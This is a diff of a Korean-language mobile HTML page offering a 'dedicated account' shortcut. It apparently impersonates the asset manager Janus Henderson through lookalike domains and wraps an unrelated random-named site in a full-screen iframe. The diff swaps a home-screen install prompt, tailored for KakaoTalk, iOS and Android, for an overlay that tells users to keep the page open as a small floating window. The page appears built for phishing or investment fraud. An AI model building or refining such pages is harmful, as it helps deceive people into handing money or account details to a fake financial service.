@@ -6,16 +6,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
 
     <title>전용계좌 바로가기</title>
-
-    <link rel="manifest" href="../manifest.json">
-    <meta name="theme-color" content="#111111">
-    <link rel="apple-touch-icon" href="../app.png">
-
-    <link rel="icon" type="image/png" href="../app2.png">
+    <link rel="icon" type="image/png" href="../JHOne/app2.png">
 
     <meta property="og:title" content="전용계좌 바로가기">
     <meta property="og:description" content="클릭하여 전용 계좌 서비스를 이용하세요">
-    <meta property="og:image" content="https://janushenderson.one/app/JHOne/app2.png">
+    <meta property="og:image" content="https://janushenderson.io/app/JHOne/app2.png">
     <meta property="og:url" content="https://janushenderson.one/app/handel/">
     <meta property="og:type" content="website">
 
@@ -26,6 +21,7 @@
             height: 100%;
             overflow: hidden;
             touch-action: manipulation;
+            font-family: Arial, sans-serif;
         }
 
         iframe {
@@ -35,72 +31,107 @@
             border: none;
         }
 
-        .pwa-guide {
+        .top-guide {
             position: fixed;
-            top: 12px;
-            left: 12px;
-            right: 12px;
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 12px;
-            background: rgba(20, 20, 20, 0.92);
+            inset: 0;
+            z-index: 99999;
+            background: rgba(0, 0, 0, 0.38);
+            pointer-events: none;
+            animation: guideFadeOut 0.6s ease forwards;
+            animation-delay: 4.4s;
+        }
+
+        .guide-box {
+            position: absolute;
+            top: 72px;
+            right: 18px;
+            max-width: 245px;
+            padding: 14px 16px;
+            border-radius: 12px;
+            background: rgba(17, 17, 17, 0.88);
             color: #fff;
-            border-radius: 10px;
-            font-family: Arial, sans-serif;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.25);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+            animation: guidePulse 1.2s ease-in-out infinite;
         }
 
-        .pwa-guide-text {
-            flex: 1;
-            min-width: 0;
-        }
-
-        .pwa-guide-text strong {
+        .guide-title {
             display: block;
-            font-size: 14px;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
+            font-size: 15px;
+            font-weight: 700;
         }
 
-        .pwa-guide-text span {
+        .guide-text {
             display: block;
-            font-size: 12px;
-            line-height: 1.35;
-            color: #e8e8e8;
+            font-size: 13px;
+            line-height: 1.45;
+            color: #f0f0f0;
         }
 
-        #pwa-install-btn {
-            border: 0;
-            padding: 8px 10px;
-            border-radius: 6px;
-            background: #ffffff;
-            color: #111111;
-            font-size: 12px;
-            white-space: nowrap;
+        .guide-arrow {
+            position: absolute;
+            top: 18px;
+            right: 28px;
+            width: 72px;
+            height: 72px;
+            border-top: 4px solid #ffffff;
+            border-right: 4px solid #ffffff;
+            transform: rotate(-10deg);
+            animation: arrowMove 0.9s ease-in-out infinite;
         }
 
-        #pwa-close-btn {
-            border: 0;
-            background: transparent;
-            color: #ffffff;
-            font-size: 22px;
-            line-height: 1;
+        .guide-arrow::after {
+            content: "";
+            position: absolute;
+            top: -9px;
+            right: -9px;
+            width: 14px;
+            height: 14px;
+            border-top: 4px solid #ffffff;
+            border-right: 4px solid #ffffff;
+            transform: rotate(45deg);
+        }
+
+        @keyframes arrowMove {
+            0%, 100% {
+                transform: translate(0, 0) rotate(-10deg);
+                opacity: 0.75;
+            }
+            50% {
+                transform: translate(8px, -8px) rotate(-10deg);
+                opacity: 1;
+            }
+        }
+
+        @keyframes guidePulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.025);
+            }
+        }
+
+        @keyframes guideFadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
         }
     </style>
 </head>
 <body>
     <iframe src="https://www.njvksdfa.com"></iframe>
 
-    <div id="pwa-guide" class="pwa-guide">
-        <div class="pwa-guide-text">
-            <strong>홈 화면에 추가</strong>
-            <span id="pwa-guide-message">
-                이 페이지를 홈 화면에 추가하면 앱처럼 바로 열 수 있습니다.
+    <div class="top-guide" id="top-guide">
+        <div class="guide-arrow"></div>
+        <div class="guide-box">
+            <span class="guide-title">창을 작게 띄우기</span>
+            <span class="guide-text">
+                오른쪽 위의 아래쪽 화살표 아이콘을 누르면 창을 작게 띄울 수 있습니다.
+                다시 열려면 오른쪽 플로팅 창을 눌러주세요.
             </span>
         </div>
-        <button id="pwa-install-btn" type="button">추가 안내</button>
-        <button id="pwa-close-btn" type="button">×</button>
     </div>
 
     <script>
@@ -114,64 +145,12 @@
             }
         }, { passive: false });
 
-        let deferredPrompt = null;
-
-        const guide = document.getElementById("pwa-guide");
-        const message = document.getElementById("pwa-guide-message");
-        const installBtn = document.getElementById("pwa-install-btn");
-        const closeBtn = document.getElementById("pwa-close-btn");
-
-        const ua = navigator.userAgent.toLowerCase();
-        const isKakao = ua.includes("kakaotalk");
-        const isIOS = /iphone|ipad|ipod/.test(ua);
-        const isAndroid = ua.includes("android");
-        const isStandalone =
-            window.matchMedia("(display-mode: standalone)").matches ||
-            window.navigator.standalone === true;
-
-        if (isStandalone || localStorage.getItem("pwaGuideClosed") === "1") {
-            guide.style.display = "none";
-        }
-
-        if (isKakao) {
-            message.textContent = "홈 화면에 추가하려면 Safari 또는 Chrome에서 이 페이지를 열어주세요.";
-            installBtn.textContent = "브라우저에서 열기";
-        } else if (isIOS) {
-            message.textContent = "Safari 하단 공유 버튼을 누른 뒤 '홈 화면에 추가'를 선택하세요.";
-            installBtn.textContent = "안내 확인";
-        } else if (isAndroid) {
-            message.textContent = "Chrome 메뉴에서 '홈 화면에 추가' 또는 '앱 설치'를 선택하세요.";
-            installBtn.textContent = "홈 화면에 추가";
-        }
-
-        window.addEventListener("beforeinstallprompt", function (event) {
-            event.preventDefault();
-            deferredPrompt = event;
-            installBtn.textContent = "홈 화면에 추가";
-        });
-
-        installBtn.addEventListener("click", async function () {
-            if (deferredPrompt) {
-                deferredPrompt.prompt();
-                await deferredPrompt.userChoice;
-                deferredPrompt = null;
-                guide.style.display = "none";
-                return;
+        setTimeout(function () {
+            const guide = document.getElementById("top-guide");
+            if (guide) {
+                guide.remove();
             }
-
-            if (isKakao) {
-                alert("카카오톡 화면 오른쪽 위 메뉴에서 '브라우저에서 열기'를 선택한 뒤 홈 화면에 추가하세요.");
-            } else if (isIOS) {
-                alert("Safari 하단 공유 버튼을 누른 뒤 '홈 화면에 추가'를 선택하세요.");
-            } else {
-                alert("브라우저 메뉴에서 '홈 화면에 추가' 또는 '앱 설치'를 선택하세요.");
-            }
-        });
-
-        closeBtn.addEventListener("click", function () {
-            localStorage.setItem("pwaGuideClosed", "1");
-            guide.style.display = "none";
-        });
+        }, 5200);
     </script>
 </body>
 </html>
